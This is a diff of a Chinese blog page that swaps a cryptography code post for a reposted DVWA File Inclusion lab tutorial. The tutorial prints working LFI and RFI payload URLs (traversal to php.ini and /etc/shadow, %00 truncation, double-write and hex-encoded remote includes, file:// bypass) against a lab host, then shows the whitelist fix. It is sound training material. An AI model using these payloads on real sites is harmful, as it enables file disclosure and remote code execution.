@@ -86,7 +86,7 @@
 
 
 
-  <meta name="keywords" content="密码学," />
+  <meta name="keywords" content="DVWA教程," />
 
 
 
@@ -100,17 +100,35 @@
 
 
 <meta name="description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
-<meta name="keywords" content="密码学">
+<meta name="keywords" content="DVWA教程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="素数-模幂-求逆运算">
-<meta property="og:url" content="http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/index.html">
+<meta property="og:title" content="DVWA之File Inclusion">
+<meta property="og:url" content="http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/index.html">
 <meta property="og:site_name" content="清沐园 | wlfsky">
 <meta property="og:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-12-23T06:18:26.361Z">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784220172185.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784220488447.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784220802790.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784221284731.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/1478422166374.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784222219706.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784222529627.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784222814815.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784223166097.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784223562200.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784223912895.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/1478422430551.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784224607432.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784224905493.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784225304478.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161106/14784225715815.png!small">
+<meta property="og:updated_time" content="2018-01-19T08:27:53.717Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="素数-模幂-求逆运算">
+<meta name="twitter:title" content="DVWA之File Inclusion">
 <meta name="twitter:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta name="twitter:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
 
 
 
@@ -140,13 +158,13 @@
 
 
 
-  <link rel="canonical" href="http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/"/>
+  <link rel="canonical" href="http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/"/>
 
 
 
 
 
-  <title>素数-模幂-求逆运算 | 清沐园 | wlfsky</title>
+  <title>DVWA之File Inclusion | 清沐园 | wlfsky</title>
   
 
 
@@ -294,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/">
+    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wlfsky">
@@ -311,7 +329,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">素数-模幂-求逆运算</h2>
+          <h2 class="post-title" itemprop="name headline">DVWA之File Inclusion</h2>
         
 
         <div class="post-meta">
@@ -323,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T14:04:41+08:00">
-                2017-12-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-19T15:50:28+08:00">
+                2018-01-19
               </time>
             
 
@@ -339,34 +357,12 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2017-12-23T14:18:26+08:00">
-                2017-12-23
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-19T16:27:53+08:00">
+                2018-01-19
               </time>
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/密码学/" itemprop="url" rel="index">
-                    <span itemprop="name">密码学</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -394,7 +390,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  456
+                  1,934
                 </span>
               
 
@@ -410,7 +406,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  8
                 </span>
               
             </div>
@@ -435,12 +431,120 @@
 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
 </code></pre><a id="more"></a>
 <hr>
-<h4 id="生成素数"><a href="#生成素数" class="headerlink" title="生成素数"></a>生成素数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成素数 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义一个生成奇数的函数，从3开始，生成的是一个无限序列 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd_iter</span><span class="params">()</span>:</span>  </span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:  </span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个筛选函数 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_</span><span class="params">(n)</span>:</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x : x % n &gt; <span class="number">0</span> </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 生成素数序列   </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 返回素数2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># 初始序列</span></span><br><span class="line">    it = odd_iter()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment"># 返回序列的第一个数</span></span><br><span class="line">        n = next(it)</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        <span class="comment"># 构造新序列</span></span><br><span class="line">        it = filter(filter_(n), it)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suShu</span><span class="params">()</span>:</span></span><br><span class="line">    num = int(input(<span class="string">'请输入需要生成素数的位数：'</span>))</span><br><span class="line">    print(<span class="string">'正在生成素数，请稍等...'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> primes():</span><br><span class="line">        <span class="keyword">if</span> len(str(i)) == num:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>以上为生成素数的源码，参考自：<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431821084171d2e0f22e7cc24305ae03aa0214d0ef29000" target="_blank" rel="noopener">廖雪峰</a> 但是这个源码在生成7位以上的素数时运行速度会很慢，甚至有可能报出<em>堆栈溢出</em> 的错误，读者如果有更好的源码，希望可以分享出来哦！</p>
-<h4 id="模幂运算"><a href="#模幂运算" class="headerlink" title="模幂运算"></a>模幂运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模幂运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moMi</span><span class="params">()</span>:</span></span><br><span class="line">    moShu = int(input(<span class="string">'请输入模数:'</span>))</span><br><span class="line">    beiMoShu = int(input (<span class="string">'请输入被模数:'</span>))</span><br><span class="line">    ciMiShu = int(input (<span class="string">'请输入次幂数:'</span>))</span><br><span class="line">    result = beiMoShu ** ciMiShu</span><br><span class="line">    result_output = result % moShu</span><br><span class="line">    print(<span class="string">'模幂的结果为：'</span>, result_output)</span><br></pre></td></tr></table></figure>
-<p>以上为模幂运算的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p>
-<h4 id="求逆运算"><a href="#求逆运算" class="headerlink" title="求逆运算"></a>求逆运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求逆运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qiuNi</span><span class="params">()</span>:</span></span><br><span class="line">    e = int(input(<span class="string">'请输入被模数：'</span>))</span><br><span class="line">    mod = int(input(<span class="string">'请输入模数：'</span>))</span><br><span class="line">    num = e</span><br><span class="line">    d = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (num % mod) != <span class="number">1</span>:</span><br><span class="line">        d = d + <span class="number">1</span></span><br><span class="line">        num = num + e</span><br><span class="line">    print(<span class="string">'求得的逆为：'</span>, d)</span><br></pre></td></tr></table></figure>
-<p>以上为求逆运算的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p>
+<p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p>
+<h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p>DVWA共有十个模块，分别是</p>
+<blockquote>
+<p>Brute Force（蛮力攻击）</p>
+<p>Command Injection（命令行注入）</p>
+<p>CSRF（跨站请求伪造）</p>
+<p>File Inclusion（文件包含）</p>
+<p>File Upload（文件上传）</p>
+<p>Insecure CAPTCHA （不安全的验证码）</p>
+<p>SQL Injection（SQL注入）</p>
+<p>SQL Injection（Blind）（SQL盲注）</p>
+<p>XSS（Reflected）（反射型跨站脚本）</p>
+<p>XSS（Stored）（存储型跨站脚本）</p>
+</blockquote>
+<p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p>
+<p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a><strong>File Inclusion</strong></h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<p><a href="http://image.3001.net/images/20161106/14784220172185.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220172185.png!small" alt="1.png"></a></p>
+<p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p><a href="http://image.3001.net/images/20161106/14784220488447.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220488447.png!small" alt="1.png"></a></p>
+<p>点击file1.php后，显示如下</p>
+<p><a href="http://image.3001.net/images/20161106/14784220802790.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220802790.png!small" alt="1.png"></a></p>
+<p>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.本地文件包含</p>
+<p>构造url</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow</a></p>
+</blockquote>
+<p><a href="http://image.3001.net/images/20161106/14784221284731.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784221284731.png!small" alt="1.png"></a></p>
+<p>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径C:\xampp\htdocs。</p>
+<p>构造url（绝对路径）</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini</a></p>
+</blockquote>
+<p>成功读取了服务器的php.ini文件</p>
+<p><a href="http://image.3001.net/images/20161106/1478422166374.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/1478422166374.png!small" alt="1.png"></a></p>
+<p>构造url（相对路径）</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=..................\xampp\htdocs\dvwa\php.ini</a></p>
+</blockquote>
+<p>加这么多..\是为了保证到达服务器的C盘根目录，可以看到读取是成功的。</p>
+<p><a href="http://image.3001.net/images/20161106/14784222219706.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222219706.png!small" alt="1.png"></a></p>
+<p>同时我们看到，配置文件中的Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。</p>
+<blockquote>
+<p>A)<a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=..................\xampp\htdocs\dvwa\php.ini</a></p>
+<p>B)<a href="">http://192.168.153.130/xampp/htdocs/dvwa/php.ini</a></p>
+</blockquote>
+<p>可惜的是由于本次实验环境的php版本为5.4.31，所以无法进行验证。</p>
+<p><a href="http://image.3001.net/images/20161106/14784222529627.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222529627.png!small" alt="1.png"></a></p>
+<p>使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。</p>
+<p>2.远程文件包含</p>
+<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下</p>
+<p><a href="http://image.3001.net/images/20161106/14784222814815.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222814815.png!small" alt="1.png"></a></p>
+<p>构造url</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</a></p>
+</blockquote>
+<p>成功在服务器上执行了phpinfo函数</p>
+<p><a href="http://image.3001.net/images/20161106/14784223166097.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223166097.png!small" alt="1.png"></a></p>
+<p>为了增加隐蔽性，可以对<a href="">http://192.168.5.12/phpinfo.txt</a>进行编码</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</a></p>
+</blockquote>
+<p>同样可以执行成功</p>
+<p><a href="http://image.3001.net/images/20161106/14784223562200.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223562200.png!small" alt="1.png"></a></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file ); </span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file ); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="noopener">https://”、</a> ” ../”、”..\”替换为空字符，即删除。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p>
+<p>例如page=<a href="">hthttp://tp://192.168.5.12/phpinfo.txt</a>时，str_replace函数会将<a href="http://删除，于是page=[http://192.168.5.12/phpinfo.txt]()，成功执行远程命令。" target="_blank" rel="noopener">http://删除，于是page=[http://192.168.5.12/phpinfo.txt]()，成功执行远程命令。</a></p>
+<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
+<p>1.本地文件包含</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
+</blockquote>
+<p>读取配置文件成功</p>
+<p><a href="http://image.3001.net/images/20161106/14784223912895.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223912895.png!small" alt="1.png"></a></p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini</a></p>
+</blockquote>
+<p>绝对路径不受任何影响，读取成功</p>
+<p><a href="http://image.3001.net/images/20161106/1478422430551.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/1478422430551.png!small" alt="1.png"></a></p>
+<p>2.远程文件包含</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
+</blockquote>
+<p>远程执行命令成功</p>
+<p><a href="http://image.3001.net/images/20161106/14784224607432.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784224607432.png!small" alt="1.png"></a></p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</a></p>
+</blockquote>
+<p>经过编码后的url不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是<a href="">http://192.168.5.12/phpinfo.txt</a>，因此读取失败。</p>
+<p><a href="http://image.3001.net/images/20161106/14784224905493.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784224905493.png!small" alt="1.png"></a></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。</p>
+<p><a href="http://image.3001.net/images/20161106/14784225304478.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784225304478.png!small" alt="1.png"></a></p>
+<p>构造url</p>
+<blockquote>
+<p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
+</blockquote>
+<p>成功读取了服务器的配置文件</p>
+<p><a href="http://image.3001.net/images/20161106/14784225715815.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784225715815.png!small" alt="1.png"></a></p>
+<p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php </span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
 
       
     </div>
@@ -490,7 +594,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/" title="素数-模幂-求逆运算">http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/</a>
+    <a href="http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/" title="DVWA之File Inclusion">http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -505,7 +609,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/密码学/" rel="tag"><i class="fa fa-tag"></i> 密码学</a>
+            <a href="/tags/DVWA教程/" rel="tag"><i class="fa fa-tag"></i> DVWA教程</a>
           
         </div>
       
@@ -518,8 +622,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/23/Hill密码/" rel="next" title="Hill密码">
-                <i class="fa fa-chevron-left"></i> Hill密码
+              <a href="/2018/01/19/DVWA之CSRF/" rel="next" title="DVWA之CSRF">
+                <i class="fa fa-chevron-left"></i> DVWA之CSRF
               </a>
             
           </div>
@@ -528,8 +632,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/01/15/SQL注入技术/" rel="prev" title="SQL注入技术">
-                SQL注入技术 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/01/19/DVWA之File-Upload/" rel="prev" title="DVWA之File Upload">
+                DVWA之File Upload <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -935,7 +1039,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#生成素数"><span class="nav-number">1.</span> <span class="nav-text">生成素数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模幂运算"><span class="nav-number">2.</span> <span class="nav-text">模幂运算</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#求逆运算"><span class="nav-number">3.</span> <span class="nav-text">求逆运算</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA简介"><span class="nav-number">1.</span> <span class="nav-text">DVWA简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">2.</span> <span class="nav-text">File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low"><span class="nav-number">3.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium"><span class="nav-number">4.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High"><span class="nav-number">5.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible"><span class="nav-number">6.</span> <span class="nav-text">Impossible</span></a></li></ol></div>
             
 
           </div>
